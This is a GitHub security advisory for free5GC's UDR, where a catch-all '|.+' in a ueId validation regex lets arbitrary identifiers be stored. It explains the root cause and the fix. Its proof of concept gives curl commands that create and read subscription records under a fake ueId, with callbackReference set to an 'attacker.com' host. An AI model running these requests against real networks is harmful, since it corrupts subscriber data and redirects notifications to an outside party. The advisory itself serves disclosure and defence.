# [M] free5GC UDR has improper `ueId` validation in EE subscription handlers that allows arbitrary identifier persistence

## Summary
Severity: Medium
Advisory: GHSA-6gxq-gpr8-xgjp
CVE: CVE-2026-47780
CWE: CWE-20
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:L/SA:N/E:U (CVSS_V4)
Published: 2026-06-11
Source: https://github.com/advisories/GHSA-6gxq-gpr8-xgjp
Type: github-advisory

## Affected
- Go: `github.com/free5gc/udr` — affected >=0

## Details
### Summary
The free5GC UDR accepts arbitrary non-3GPP ueId values in the EE subscription creation and query flows because the regular expression used for validation ends with the catch-all alternative |.+. This causes the validation logic to accept any non-empty string rather than restricting input to expected SUPI/GPSI-style formats. In a tested deployment, a crafted value such as ARBITRARY_STRING was successfully stored through the POST /nudr-dr/v2/subscription-data/{ueId}/context-data/ee-subscriptions endpoint and later retrieved through the corresponding GET endpoint, demonstrating persistent database pollution and broken trust boundaries in the UDR data model.

An improper input validation issue exists in the free5GC UDR EE subscription handlers responsible for creating and querying UE event exposure subscriptions. The affected code validates ueId with a regular expression that includes a final |.+ branch, which matches any non-empty string and defeats the intended 3GPP identifier checks. As a result, an attacker able to reach the UDR SBI can submit arbitrary identifiers and have them persisted and retrieved as valid subscription records, causing unauthorized data creation and corruption of the UDR data store. 

### Details
The vulnerable logic is present in two handlers in api_datarepository.go: HandleCreateEeSubscriptions and HandleQueryeesubscriptions. Both paths rely on the same regexp.MatchString() validation pattern for ueId: ^(imsi-[0-9]{5,15}|nai-.+|msisdn-[0-9]{5,15}|extid-[^@]+@[^@]+|gci-.+|gli-.+|.+)$. The final alternative .+ acts as a universal match for any non-empty string, so values that do not conform to IMSI, NAI, MSISDN, EXTID, GCI, or GLI formats are still accepted. 

Once the validation succeeds, the handlers pass the attacker-controlled ueId into the normal processing flow. In the tested environment, POST /nudr-dr/v2/subscription-data/ARBITRARY_STRING/context-data/ee-subscriptions returned 201 Created, and the response Location header pointed to a newly created resource under the arbitrary identifier. A subsequent GET /nudr-dr/v2/subscription-data/ARBITRARY_STRING/context-data/ee-subscriptions returned 200 OK with a JSON body, confirming that the data was persisted and retrievable. This demonstrates that the issue is not limited to superficial input acceptance; it results in server-side storage of untrusted identifiers in the UDR backend.

The vulnerable pattern appears to reflect a permissive schema-style expression rather than a security-oriented validator. In an OpenAPI or data-model context, a catch-all alternative may describe allowed generic strings, but in request validation logic it nullifies the protection provided by the more specific alternatives. The proper fix is to remove the trailing |.+ branch and restrict accepted input to explicitly supported identifier formats only.

### PoC

The issue was reproduced against a running free5GC UDR instance listening on `10.22.22.5:80` with the `nudr-dr` API exposed under `/v2`. The following commands demonstrate the behavior. 

### Environment
- UDR IP: `10.22.22.5`
- UDR port: `80`
- API base path: `/nudr-dr/v2`
- Tested endpoint family: `/subscription-data/{ueId}/context-data/ee-subscriptions`

### Step 1: Create an EE subscription with a legitimate identifier
```bash
curl -X POST "http://10.22.22.5:80/nudr-dr/v2/subscription-data/imsi-208930000000001/context-data/ee-subscriptions" \
  -H "Content-Type: application/json" \
  -d '{"callbackReference": "http://attacker.com/notify"}' -v
```
Expected observed result in the test environment:
- `HTTP/1.1 201 Created`
- `Location: http://udr.sbi.fub5g.it:80/nudr-dr/v2/subscription-data/imsi-208930000000001/context-data/ee-subscriptions/1`

### Step 2: Create an EE subscription with an arbitrary non-3GPP identifier
```bash
curl -X POST "http://10.22.22.5:80/nudr-dr/v2/subscription-data/ARBITRARY_STRING/context-data/ee-subscriptions" \
  -H "Content-Type: application/json" \
  -d '{"callbackReference": "http://attacker.com/notify"}' -v
```
Observed result in the test environment:
- `HTTP/1.1 201 Created`
- `Location: http://udr.sbi.fub5g.it:80/nudr-dr/v2/subscription-data/ARBITRARY_STRING/context-data/ee-subscriptions/2`
- Body: `{}`

This confirms that the arbitrary `ueId` passed validation and was accepted as a valid resource key.

### Step 3: Retrieve the data stored under the arbitrary identifier
```bash
curl "http://10.22.22.5:80/nudr-dr/v2/subscription-data/ARBITRARY_STRING/context-data/ee-subscriptions" -v
```
Observed result in the test environment:
- `HTTP/1.1 200 OK`
- Body: `[{}]`

This confirms persistence and retrieval of a subscription record under an attacker-chosen invalid `ueId`.

### Affected code pattern
```go
match, err := regexp.MatchString(
    `^(imsi-[0-9]{5,15}|nai-.+|msisdn-[0-9]{5,15}|extid-[^@]+@[^@]+|gci-.+|gli-.+|.+)$`,
    ueId,
)
if !match {
    // return 400
}
```

### Recommended fix
```go
match, err := regexp.MatchString(
    `^(imsi-[0-9]{5,15}|nai-.+|msisdn-[0-9]{5,15}|extid-[^@]+@[^@]+|gci-.+|gli-.+)$`,
    ueId,
)
```

### Impact
This is an **improper input validation** vulnerability that enables arbitrary identifier injection into the UDR EE subscription data path. Any actor with network reachability to the UDR SBI endpoint can create and query records bound to non-compliant, attacker-controlled `ueId` values. Depending on deployment assumptions, this may allow unauthorized data creation, persistent data corruption, namespace pollution, and interference with downstream components that trust UDR-stored identifiers to follow valid 3GPP formats. 

The issue affects deployments exposing the vulnerable UDR EE subscription handlers and is particularly relevant in lab, test, and loosely segmented SBI environments where direct access to the UDR is possible. Because the flaw results in persistence of attacker-chosen identifiers, the impact extends beyond a simple validation bypass and reaches integrity of stored subscriber-related metadata.

## References
- https://github.com/free5gc/free5gc/security/advisories/GHSA-6gxq-gpr8-xgjp
- https://github.com/free5gc/free5gc
